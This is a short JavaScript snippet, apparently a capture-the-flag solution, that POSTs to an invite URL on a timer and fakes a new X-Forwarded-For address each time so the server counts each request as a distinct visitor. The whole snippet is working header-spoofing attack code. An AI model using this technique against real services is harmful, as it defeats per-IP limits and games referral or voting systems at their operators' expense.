
// dirmap?

// bing: CTF ip 

i = 10;
setInterval(() => {
  fetch("http://202.38.93.111:10888/invite/1c73a41f-7052-4d29-9710-211e5cd53481", {
    "headers": {
      "content-type": "application/x-www-form-urlencoded",
      "X-Forwarded-For": i + ".0.0.0"
    },
    "body": "ip=" + i + ".0.0.0",
    "method": "POST",
  });
  i += 1;
}, Math.random() * 200 + 1000);
